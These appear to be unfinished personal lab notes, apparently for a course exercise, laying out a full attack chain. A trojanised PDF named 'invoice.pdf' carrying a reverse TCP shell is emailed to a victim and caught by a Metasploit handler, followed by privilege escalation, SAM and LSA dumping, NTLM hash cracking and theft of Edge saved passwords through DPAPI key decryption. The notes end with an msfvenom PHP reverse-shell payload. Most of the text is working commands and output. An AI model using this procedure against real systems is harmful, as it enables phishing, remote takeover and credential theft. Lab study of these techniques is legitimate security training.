# Skip reading this file as it is still not ready (will upd later)
Download vulnerable Adobe Reader https://archive.org/download/AdobeReaderArchives6x11x/Reader%209.0/ENU/AdbeRdr90_en_US_Std.exe

Install in Windows, and then Open the App >> Preferences>> Trust Manager>> Disable the auto update

In Kali
Setoolkit>> 1 Social Eng>> 1 Spear Fishing Attack>> 2 Create FileFormat Payload>> 13 Adobe PFD Embedded EXE>> 2 Use BuiltIn>> 5 Windows Reverse TCP Shell

Use the mahcine ip and 4444 as port

Then copy the payload to you workplace folder Desktop/226_part3

mkdir ~/Desktop/226_part3/ && sudo cp /root/.set/template.pdf /home/kaled/Desktop/226_part3/invoice.pdf
sudo cp /root/.set/template.rc /home/kaled/Desktop/226_part3/template.rc

Send the pdf as email attachment

Metasploit>>
sudo msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.8.10; set lport 4444; exploit"



In windows 
Prepare for this work:
Create admin account via admin cmd:
net user admin1 aaa /add
net localgroup Administrators admin1 /add

Then apply
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
shutdown /r /t 0

After restart login using admin1 account
Browse DVWA in hullu using edge and save the credentials
in firewall exclude exe and pdf
open the local email sever download the pdf, open it in the outdated acrobat reader, then open it it will ask to save the payload `form` save it int e document file (this is the default of the payload or need to change it)


Find fresh x64 explorer.exe PID owned by current user
ps | grep explorer
or 
pgrep explorer

migrate <PID>
getsystem
getuid    

load kiwi
lsa_dump_sam
lsa_dump_secrets

Look for something like
User : admin1
Hash NTLM: e24106942bf38bcf57a6a4b29016eff6

In new terminal do:
echo 'e24106942bf38bcf57a6a4b29016eff6' > ntlm.txt
john --format=NT --incremental=Lower ntlm.txt


Get the Edge saved login credentials>>
cd "C:\Users\admin1\AppData\Local\Microsoft\Edge\User Data\Default"
download "Login Data" /home/kaled/Desktop/226_part3/
cd "C:\Users\admin1\AppData\Local\Microsoft\Edge\User Data"
download "Local State" /home/kaled/Desktop/226_part3/

Open "Local State" in mousepad and search for "os_crypt" to see the encryoted key.
dir "C:\Users\admin1\AppData\Roaming\Microsoft\Protect"
The saved credentials in Edge >> get "Login Data">> get the key in "Local State">> get DPAPI Master Key>> Get the Active user password

meterpreter > cd "C:\Users\admin1\AppData\Roaming\Microsoft\Protect"
meterpreter > dir
Listing: C:\Users\admin1\AppData\Roaming\Microsoft\Protect
==========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  24    fil   2026-08-26 09:39:45 -0400  CREDHIST
040777/rwxrwxrwx  0     dir   2026-08-26 09:39:45 -0400  S-1-5-21-2768268201-1826340971-3484343115-1002

meterpreter > cd "S-1-5-21-2768268201-1826340971-3484343115-1002"
meterpreter > dir
Listing: C:\Users\admin1\AppData\Roaming\Microsoft\Protect\S-1-5-21-2768268201-1826340971-3484343115-1002
=========================================================================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  468   fil   2026-08-26 09:39:45 -0400  3b65c54f-d94d-45b3-a91e-9df6eade0559
100666/rw-rw-rw-  24    fil   2026-08-26 09:39:45 -0400  Preferred
meterpreter > download 3b65c54f-d94d-45b3-a91e-9df6eade0559 /home/admin1/Desktop/226_part3/
[*] Downloading: 3b65c54f-d94d-45b3-a91e-9df6eade0559 -> /home/admin1/Desktop/226_part3/3b65c54f-d94d-45b3-a91e-9df6eade0559
[*] Downloaded 468.00 B of 468.00 B (100.0%): 3b65c54f-d94d-45b3-a91e-9df6eade0559 -> /home/admin1/Desktop/226_part3/3b65c54f-d94d-45b3-a91e-9df6eade0559
[*] Completed  : 3b65c54f-d94d-45b3-a91e-9df6eade0559 -> /home/admin1/Desktop/226_part3/3b65c54f-d94d-45b3-a91e-9df6eade0559


┌──(kaled㉿kali)-[~/Desktop/226_part3]
└─$ pypykatz dpapi prekey nt S-1-5-21-2768268201-1826340971-3484343115-1002 e24106942bf38bcf57a6a4b29016eff6 > prekeys.txt
                                                                                                                                                                                                       
┌──(kaled㉿kali)-[~/Desktop/226_part3]
└─$ cat prekeys.txt

87b963b78385957b19558bc9c6d80d15c3900d74
225268c16ab7c2b8b93a35a51b2121a7e9575984


┌──(kaled㉿kali)-[~/Desktop/226_part3]
└─$ impacket-dpapi masterkey -file 3b65c54f-d94d-45b3-a91e-9df6eade0559 -sid S-1-5-21-2768268201-1826340971-3484343115-1002 -password aaa

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 3b65c54f-d94d-45b3-a91e-9df6eade0559
Flags       :        5 (5)
Policy      :        0 (0)
MasterKeyLen: 000000b0 (176)
BackupKeyLen: 00000090 (144)
CredHistLen : 00000014 (20)
DomainKeyLen: 00000000 (0)

Decrypted key with User Key (SHA1)
Decrypted key: 0x4d264fbb2815f918db1bb6f31b57757cbeabb14a9c5f5fa1ce8530f900fa1d29b466058227be41c96509a087620653756f768e2eca652c3bd4a78418a6beff9d


┌──(kaled㉿kali)-[~/Desktop/226_part3]
└─$ python3 -c "
import uuid
d = open('key.blob','rb').read()
print('MasterKey GUID:', str(uuid.UUID(bytes_le=d[24:40])))
"

MasterKey GUID: 3b65c54f-d94d-45b3-a91e-9df6eade0559


Create PHP payload>>
cd Desktop
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.8.10 lport=5555 -f raw -o shell.php
sudo msfconsole -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set lhost 192.168.8.10; set lport 5555; exploit"


